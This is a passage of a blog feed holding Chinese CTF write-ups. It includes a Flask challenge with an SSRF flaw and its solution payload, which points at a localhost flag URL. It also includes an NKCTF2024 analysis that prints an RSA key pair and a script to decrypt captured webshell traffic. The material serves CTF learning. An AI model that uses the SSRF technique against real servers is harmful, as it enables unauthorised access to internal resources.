string">'呀呦轰'</span><span class="token punctuation">,</span><span class="token string">'T'</span><span class="token punctuation">:</span> <span class="token string">'呀呦呀呦轰'</span><span class="token punctuation">,</span><span class="token string">'U'</span><span class="token punctuation">:</span> <span class="token string">'呀呦呀呦呀呦轰'</span><span class="token punctuation">,</span><span class="token string">'V'</span><span class="token punctuation">:</span> <span class="token string">'呀呦呀呦呀呦呀呦轰'</span><span class="token punctuation">,</span><span class="token string">'W'</span><span class="token punctuation">:</span> <span class="token string">'呀呦呀呦呀呦呀呦呀呦轰'</span><span class="token punctuation">,</span><span class="token string">'X'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡轰'</span><span class="token punctuation">,</span><span class="token string">'Y'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡达姆阿卡轰'</span><span class="token punctuation">,</span><span class="token string">'Z'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡达姆阿卡达姆阿卡轰'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡达姆阿卡达姆阿卡达姆阿卡轰'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token string">'达姆阿卡达姆阿卡达姆阿卡达姆阿卡达姆阿卡轰'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">:</span> <span class="token string">'玛巴轰'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">:</span> <span class="token string">'玛巴玛巴轰'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">:</span> <span class="token string">'玛巴玛巴玛巴轰'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">:</span> <span class="token string">'玛巴玛巴玛巴玛巴轰'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">:</span> <span class="token string">'巴卡玛巴轰'</span><span class="token punctuation">,</span><span class="token string">'7'</span><span class="token punctuation">:</span> <span class="token string">'巴卡玛巴巴卡玛巴轰'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">:</span> <span class="token string">'巴卡玛巴巴卡玛巴巴卡玛巴轰'</span><span class="token punctuation">,</span><span class="token string">'9'</span><span class="token punctuation">:</span> <span class="token string">'巴卡玛巴巴卡玛巴巴卡玛巴巴卡玛巴轰'</span><span class="token punctuation">,</span><span class="token string">'='</span><span class="token punctuation">:</span> <span class="token string">'妈个巴子轰'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">:</span> <span class="token string">'妈个巴卡轰'</span><span class="token punctuation">,</span><span class="token string">'+'</span><span class="token punctuation">:</span> <span class="token string">'妈个巴达轰'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token comment"># 要解码的编码消息</span>encoded_message <span class="token operator">=</span> <span class="token string">"玛卡巴卡玛卡巴卡轰达姆阿卡嗙轰阿巴雅卡阿巴雅卡阿巴雅卡轰达姆阿卡嗙轰哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰玛卡巴卡轰达姆阿卡嗙轰阿巴雅卡阿巴雅卡轰咿呀呦轰达姆阿卡嗙轰"</span><span class="token comment"># 解码消息</span>decoded_message <span class="token operator">=</span> decode_text<span class="token punctuation">(</span>encoded_message<span class="token punctuation">,</span> encoding_rules<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>decoded_message<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="签到-3"><a class="markdownIt-Anchor" href="#签到-3"></a> 签到</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token keyword">import</span> requestsflag<span class="token operator">=</span><span class="token string">'123'</span>  <span class="token comment"># 假设从 flag.py 文件中导入了 flag 函数</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"This is url"</span><span class="token punctuation">,</span>url<span class="token punctuation">)</span>    <span class="token keyword">if</span> url<span class="token punctuation">:</span>        <span class="token comment"># 请求url</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        content <span class="token operator">=</span> response<span class="token punctuation">.</span>text        <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"paluctf"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>            <span class="token keyword">return</span> flag        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> content    <span class="token keyword">else</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token number">200</span><span class="token punctuation">,</span>  <span class="token comment"># 这里是数值，不是字符串</span>            <span class="token string">'data'</span><span class="token punctuation">:</span> <span class="token string">"Come sign in and get the flag!"</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">flag1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"paluctf"</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload:</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1:36914&#x2F;?url&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>flag{baca6a54-66d7-4786-951b-78acafa4cf91}</strong></p><h1 id="应急响应"><a class="markdownIt-Anchor" href="#应急响应"></a> 应急响应</h1><h2 id="1"><a class="markdownIt-Anchor" href="#1"></a> 1</h2><p>105077</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NpcのDiary</title>
      <link href="/2024/04/14/Npc%E3%81%AEDiary/"/>
      <url>/2024/04/14/Npc%E3%81%AEDiary/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c317c7548e446f4a2f54533a9d32216084dc630b0808c4fd703e31476f741eb1"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-shrink">      <input class="hbe hbe-input-field hbe-input-field-shrink" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-shrink" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-shrink">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS&amp;Frida入门</title>
      <link href="/2024/04/05/Frida%E5%85%A5%E9%97%A8/"/>
      <url>/2024/04/05/Frida%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e4112546ac72b5cffd358aecff2703430f42b4efc2484bcd8ed29843510f4f21"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-shrink">      <input class="hbe hbe-input-field hbe-input-field-shrink" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-shrink" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-shrink">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NKCTF2024个人Wp</title>
      <link href="/2024/03/24/NKCTF2024%E4%B8%AA%E4%BA%BAWp/"/>
      <url>/2024/03/24/NKCTF2024%E4%B8%AA%E4%BA%BAWp/</url>
      
        <content type="html"><![CDATA[<h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="minecraftseed"><a class="markdownIt-Anchor" href="#minecraftseed"></a> MineCraft:Seed</h2><p>这个题就是根据Minecraft服务器的地图逆推出地图种子，直接下载mod:seedcrackerx跑跑图就出了</p><h2 id="webshellpro"><a class="markdownIt-Anchor" href="#webshellpro"></a> WebShellPro</h2><p>套娃题，用wireshark进行流量分析，解密多个http的响应体可以找到部分信息，然后在第9次解密密文后发现关键文件是一个hint.py的代码这个就是shell的加密方式，还有一个关键就是找到了一个Password: Password-based-encryption</p><p>稍微修改一下函数，把所有的shell信息给解密</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> unquote<span class="token keyword">import</span> libnum<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSApubkey <span class="token operator">=</span> <span class="token triple-quoted-string string">"""-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCK/qv5P8ixWjoFI2rzF62tm6sDFnRsKsGhVSCuxQIxuehMWQLmv6TPxyTQPefIKufzfUFaca/YHkIVIC19ohmE5X738TtxGbOgiGef4bvd9sU6M42k8vMlCPJp1woDFDOFoBQpr4YzH4ZTR6Ps+HP8VEIJMG5uiLQOLxdKdxi41QIDAQAB-----END PUBLIC KEY-----"""</span>prikey <span class="token operator">=</span> <span class="token triple-quoted-string string">"""-----BEGIN PRIVATE KEY-----MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAIr+q/k/yLFaOgUjavMXra2bqwMWdGwqwaFVIK7FAjG56ExZAua/pM/HJNA958gq5/N9QVpxr9geQhUgLX2iGYTlfvfxO3EZs6CIZ5/hu932xTozjaTy8yUI8mnXCgMUM4WgFCmvhjMfhlNHo+z4c/xUQgkwbm6ItA4vF0p3GLjVAgMBAAECgYBDsqawT5DAUOHRft6oZ+//jsJMTrOFu41ztrKkbPAUqCesh+4R1WXAjY4wnvY1WDCBN5CNLLIo4RPuli2R81HZ4OpZuiHv81sNMccauhrJrioDdbxhxbM7/jQ6M9YajwdNisL5zClXCOs1/y01+9vDiMDk0kX8hiIYlpPKDwjqQQJBAL6Y0fuoJng57GGhdwvN2c656tLDPj9GRi0sfeeMqavRTMz6/qea1LdAuzDhRoS2Wb8ArhOkYns0GMazzc1q428CQQC6sM9OiVR4EV/ewGnBnF+0p3alcYr//Gp1wZ6fKIrFJQpbHTzf27AhKgOJ1qB6A7P/mQS6JvYDPsgrVkPLRnX7AkEAr/xpfyXfB4nsUqWFR3f2UiRmx98RfdlEePeo9YFzNTvX3zkuo9GZ8e8qKNMJiwbYzT0yft59NGeBLQ/eynqUrwJAE6Nxy0Mq/Y5mVVpMRa+babeMBY9SHeeBk22QsBFlt6NT2Y3Tz4CeoH547NEFBJDLKIICO0rJ6kF6cQScERASbQJAZy088sVY6DJtGRLPuysv3NiyfEvikmczCEkDPex4shvFLddwNUlmhzml5pscIie44mBOJ0uX37y+co3q6UoRQg==-----END PRIVATE KEY-----"""</span>pubkey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>pubkey<span class="token punctuation">)</span>prikey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>prikey<span class="token punctuation">)</span>n <span class="token operator">=</span> pubkey<span class="token punctuation">.</span>n<span class="token keyword">def</span> <span class="token function">enc_replace</span><span class="token punctuation">(</span>base64_str<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    base64_str <span class="token operator">=</span> base64_str<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"e5Lg^FM5EQYe5!yF&amp;62%V$UG*B*RfQeM"</span><span class="token punctuation">)</span>    base64_str <span class="token operator">=</span> base64_str<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">,</span> <span class="token string">"n6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8W"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> base64_str<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">,</span> <span class="token string">"JXWUDuLUgwRLKD9fD6&amp;VY2aFeE&amp;r@Ff2"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dec_replace</span><span class="token punctuation">(</span>base64_str<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    base64_str <span class="token operator">=</span> base64_str<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"e5Lg^FM5EQYe5!yF&amp;62%V$UG*B*RfQeM"</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span>    base64_str <span class="token operator">=</span> base64_str<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"n6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8W"</span><span class="token punctuation">,</span> <span class="token string">"+"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> base64_str<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"JXWUDuLUgwRLKD9fD6&amp;VY2aFeE&amp;r@Ff2"</span><span class="token punctuation">,</span> <span class="token string">"="</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>plain_text<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 私钥加密</span>    cipher_text <span class="token operator">=</span> <span class="token string">b""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>plain_text<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        part <span class="token operator">=</span> plain_text<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">128</span><span class="token punctuation">]</span>        enc <span class="token operator">=</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>s2n<span class="token punctuation">(</span>part<span class="token punctuation">)</span><span class="token punctuation">,</span> prikey<span class="token punctuation">.</span>d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span>        cipher_text <span class="token operator">+=</span> enc    <span class="token keyword">return</span> enc_replace<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>cipher_text<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">:</span>    cipher_text<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>dec_replace<span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span>    plain_text<span class="token operator">=</span><span class="token string">b""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>cipher_text<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        part<span class="token operator">=</span>cipher_text<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">128</span><span class="token punctuation">]</span>        dec <span class="token operator">=</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>s2n<span class="token punctuation">(</span>part<span class="token punctuation">)</span><span class="token punctuation">,</span> pubkey<span class="token punctuation">.</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span>        plain_text <span class="token operator">+=</span> dec    <span class="token keyword">return</span> plain_text<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    c<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'FZtON9qcMwGMAVjK63BZyUElFGNTMqs1An6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8Wyn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8We5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMCBo43nSXSPiaGRZfiirk1SiEUPA6HrkDe5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeM04aEJn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WzlkHZgRLSlR5S7xBNESbzHmpKVChcFKHM9viQtOxgEwlZFmhEWAMTurszdfL8pmxokQiavn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WBJDNVULWCn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8W36n6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WqYvUBqwjn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WEcJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">,</span>       <span class="token string">'LGKL544jKbSMPaweF1FkEe5Iykv8lnzI5AN7O0rLbFOic5mOKYn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WtSYvYOySDLiYzPjGiPTM4RhX2stGfxElRHj0g2aSxLjj8IsUMrZ6uxvDwgCZlKB7o1r0xqOyru9n6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WJu1bRhbAXiHNuZ1MnlPhcgLyfk9FCNewiLM4FTwy2KywJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">,</span>       <span class="token string">'JfswXTSuox0IP5NsGTln6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WAUNIsFC7XuybsDorWNCNJe5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMe5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMn3qEUNcgn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WihMfwF6XsGOSKCqFGezqHFTO5q6VG4EDWe5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeM4Htglmtq4BmcZJKgXLvzkzA0nTFnBVP5c6zT0WX7raTEWe5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMK20o5eoe5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMuPXOMyPlgMQbAR9ZMp2Olwe5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMvbaR1NJgJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">,</span>       <span class="token string">'XFQS9n5xr9QWKewe6dw46Lmi928e5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMVmHGrQmIMTvQJr7DW6SQZLMMxCyuYMYedXzrfNxkELMX1CXl7GElxC4olcozqWnUos9IE6kSwn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WsSk2rukyrXnbnQh27ekOLf6epWfpgMmr9BKF1XXUb20pJP5fagwhxpqSeuuwAefk8UelUJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">,</span>       <span class="token string">'drt4OBTcetIurMrmriIxPhfWx5nFc2grsMhpGA8SkKTeTs4dk3UIxfphRun6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WckPvlpAn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WIunRMOHD1sHFhcjCin6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WsWxLkyKFS9IdjEZHHn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8W72bnhzZRzRcg3RLHn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8Wwpe2zS5fHA4u1Wn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8Wgb0JGW0sWgb9I5lQXTXde5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMqR0CUyxqgeKNMAwJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">,</span>       <span class="token string">'co7xLpHsVEAE5l7fsCb7VwK2NiPtkINUh7sNre5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMNhhn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8W3RkS5n6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8Wxa7OyiwyiB8jSnEVIGX2lYKa50q5YI23J5ppkhcohr0ktrcWn91MXrTV0Vq5JW6yPbItn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WbuBfQXNpYspLKV5Tljge4YWoHDQqiKCYYnPMF7LagcC9fsQffwrMSsJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">,</span>       <span class="token string">'GwFlhxRoksXdDJWaDEfySWGbRQ1SBeoX0r2lwvLePqSnZw1N75wS0sn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WONPr1c54e5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMofPeg2CsSq0UXnNHJhPuN2VpcMn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8We5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMUTJSBr3qLmR6iNe5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMKKxI6ry0CDf7SdaP1pXu8SDYeAWAuCv9xeegfRhkZt9pvXy40cNskiNM1FW7FPnEJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">,</span>       <span class="token string">'IbNEZ8rGERCl3pZe5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMe5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMrpWBqzS1NIM0CdISg8PUUBzhqYkr5s5fn2Pdn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WSeOqGaU8GJRe5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMNRlRbjXHUEEOi3vbuC52jB8LrgcnrZfFFRLtwxox91C5mXwSP6PhM3pQmsFPusKCyYP3OOIbzUa8MGqBo9OjaTxP4lVPrIBkwGcQPqqvwJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">,</span>       <span class="token string">'QO0aRn91LW114FkdPXtsz2NXBxffsluGfLkss87RnMen6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WOM0SdYBMemkKsJ5C406Izn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WPXn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8W2mC19qS0mJvPfBNMH0Vl6w72Ie5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeM20nFUokf6XNMLkq5TuvyVgjCUCZcCERF1gTAZn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8W80qMkO0VJxTqdrIc1H5MmMJpAlU2XfYRBCF5kUJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">,</span>       <span class="token string">'OTEBXOzklq47vCMun6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WvSDL2h4svC0e5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMoTkLcpmoy0HSto3GoNNT7v86XmkKmXJL0JfzvyZNjgriP7PURYREU35lTsqKxTqvFhmn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8W5n6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8W9BksBYFqdnX4HS6MMTyS44ZNjbcn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8W1jlNLvHmn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WXABbE6xihToCzcCwQPR39dVasnlr2AREUmIJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">,</span>       <span class="token string">'G1TUg4bIVOFYi8omV2SQrTa8fzYfboRNN7fV6FJn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8Wbm3O74uCUbwMkvRCYae44TX1ZO8X4w2Nk1igaIZjSQIJ9MMHhD9cn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WSV5EzikNsyM5c1nlPS8uqw1P2pJuYLaLxloK0x5xhQHDqqAxkuKrBzPn0noQ2bDn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WlVnGwsfP7YP9PYJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">,</span>       <span class="token string">'co7xLpHsVEAE5l7fsCb7VwK2NiPtkINUh7sNre5Lg%5EFM5EQYe5%21yF%2662%25V%24UG%2AB%2ARfQeMNhhn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8W3RkS5n6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8Wxa7OyiwyiB8jSnEVIGX2lYKa50q5YI23J5ppkhcohr0ktrcWn91MXrTV0Vq5JW6yPbItn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WbuBfQXNpYspLKV5Tljge4YWoHDQqiKCYYnPMF7LagcC9fsQffwrMSsJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">,</span>       <span class="token string">'G1TUg4bIVOFYi8omV2SQrTa8fzYfboRNN7fV6FJn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8Wbm3O74uCUbwMkvRCYae44TX1ZO8X4w2Nk1igaIZjSQIJ9MMHhD9cn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WSV5EzikNsyM5c1nlPS8uqw1P2pJuYLaLxloK0x5xhQHDqqAxkuKrBzPn0noQ2bDn6%26B8G6nE%402tt4UR6h3QBt%2A5%26C%26pVu8WlVnGwsfP7YP9PYJXWUDuLUgwRLKD9fD6%26VY2aFeE%26r%40Ff2'</span><span class="token punctuation">,</span>        <span class="token 